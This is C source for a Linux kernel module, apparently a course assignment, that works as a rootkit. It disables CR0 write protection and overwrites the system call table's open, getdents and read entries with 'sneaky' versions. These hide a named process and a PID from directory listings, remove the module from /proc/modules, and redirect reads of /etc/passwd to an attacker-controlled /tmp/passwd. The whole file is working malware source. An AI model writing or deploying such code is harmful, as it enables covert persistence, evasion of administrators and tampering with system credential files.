#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>
#include <linux/moduleparam.h>
#include <linux/string.h>
#include <linux/fdtable.h>
#include <linux/dcache.h>
#include <linux/file.h>
#include <linux/stat.h>

static char* mypid="";
module_param(mypid,charp,S_IRUSR|S_IWUSR|S_IRGRP|S_IROTH);
MODULE_PARM_DESC(mypid, "process id");

struct linux_dirent {
  u64            d_ino;
  s64            d_off;
  unsigned short d_reclen;
  char           d_name[256];
};

static int openflag = 0;

//Macros for kernel functions to alter Control Register 0 (CR0)
//This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
//Bit 0 is the WP-bit (write protection). We want to flip this to 0
//so that we can change the read/write permissions of kernel pages.
#define read_cr0() (native_read_cr0())
#define write_cr0(x) (native_write_cr0(x))

//These are function pointers to the system calls that change page
//permissions for the given address (page) to read-only or read-write.
//Grep for "set_pages_ro" and "set_pages_rw" in:
//      /boot/System.map-`$(uname -r)`
//      e.g. /boot/System.map-4.4.0-116-generic
void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff81072040;
void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81071fc0;

//This is a pointer to the system call table in memory
//Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
//We're getting its adddress from the System.map file (see above).
static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00200;

//Function pointer will be used to save address of original 'open' syscall.
//The asmlinkage keyword is a GCC #define that indicates this function
//should expect ti find its arguments on the stack (not in registers).
//This is used for all system calls.
asmlinkage int (*original_call)(const char *pathname, int flags,mode_t mode);
asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
asmlinkage ssize_t (*original_read)(int fd, void* buf, size_t count);

//new sneaky version of the 'getdents' syscall
asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){
  int nread = original_getdents(fd,dirp,count);
  struct linux_dirent *d;
  int bpos =0;
  if(nread<=0){
    return nread;
  }
  while(bpos<nread){
    d = (struct linux_dirent*)(bpos+(char*)dirp);
    if(strcmp(d->d_name,"sneaky_process")==0){
      //printk(KERN_INFO "find the process.\n");
      //reset the memory
      memmove(d,(char*)d+d->d_reclen, nread-(size_t)((char*)d+d->d_reclen-(char*)dirp));
      nread=nread-d->d_reclen;
      break;
    }
    else if(strcmp(d->d_name,mypid)==0){
      //printk(KERN_INFO "find the pid: %s \n",d->d_name);
      //reset the memory
      memmove(d,(char*)d+d->d_reclen, nread-(size_t)((char*)d+d->d_reclen-(char*)dirp));
      nread=nread-d->d_reclen;
      break;
    }
    bpos = bpos+d->d_reclen;
  }
  return nread;
}

//Define our new sneaky version of the 'open' syscall
asmlinkage int sneaky_sys_open(const char *pathname, int flags,mode_t mode){
  //open the "/etc/passwd"
  if(strcmp(pathname,"/etc/passwd")==0){
    char* replace = "/tmp/passwd";
    copy_to_user((char*)pathname,replace,sizeof(replace));
    }
  //open the "/proc/modules"
  else if(strcmp(pathname,"/proc/modules")==0){
    //set the flag
    openflag = 1;
  }
  printk(KERN_INFO "Very, very Sneaky!\n");
  return original_call(pathname, flags,mode);
}

//new sneaky version of the 'read' syscall
asmlinkage ssize_t sneaky_sys_read(int fd, void* buf, size_t count){
  ssize_t answer = original_read(fd,buf,count);
  char* line = NULL;
  char* end = NULL;
  if(answer<=0){
    return answer;
  }
  if(openflag ==1 && strstr(buf,"sneaky_mod")!=NULL){
    //"/proc/modules"
    openflag=0;
    line = strstr(buf,"sneaky_mod");
    if(line !=NULL){
      end = strchr(line,'\n');
      if(end!=NULL){
	memmove(line,end+1,answer-(ssize_t)(end+1-(char*)buf));
	answer = answer-(ssize_t)(end+1-line);
      }
    }
  }
  return answer;
}

//The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  struct page *page_ptr;

  //See /var/log/syslog for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));
  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is the magic! Save away the original 'open' system call
  //function address. Then overwrite its address in the system call
  //table with the function address of our new code.
  original_call = (void*)*(sys_call_table + __NR_open);
  *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
  original_getdents = (void*)*(sys_call_table + __NR_getdents);
  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;
  original_read = (void*)*(sys_call_table + __NR_read);
  *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
  
  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);

  return 0;       // to show a successful load 
}  


static void exit_sneaky_module(void) 
{
  struct page *page_ptr;

  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));

  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is more magic! Restore the original 'open' system call
  //function address. Will look like malicious code was never there!
  *(sys_call_table + __NR_open) = (unsigned long)original_call;
  *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
  *(sys_call_table + __NR_read) = (unsigned long)original_read;
  
  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);
}  

MODULE_LICENSE("rg241");
MODULE_AUTHOR("RAN GU");
module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  

